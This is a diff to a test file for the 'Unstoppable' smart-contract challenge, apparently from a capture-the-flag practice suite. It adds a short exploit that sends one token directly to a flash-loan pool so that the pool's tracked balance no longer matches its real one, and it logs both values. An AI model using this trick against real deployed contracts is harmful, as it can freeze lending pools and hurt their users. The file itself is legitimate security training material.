@@ -40,6 +40,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address,ethers.utils.parseEther('1'));
+
+        console.log("Pool balance : ",  ethers.utils.formatEther(await this.token.balanceOf(this.pool.address)));
+        console.log("Token in pool : ",  ethers.utils.formatEther(await this.pool.poolBalance()));
+
     });
 
     after(async function () {
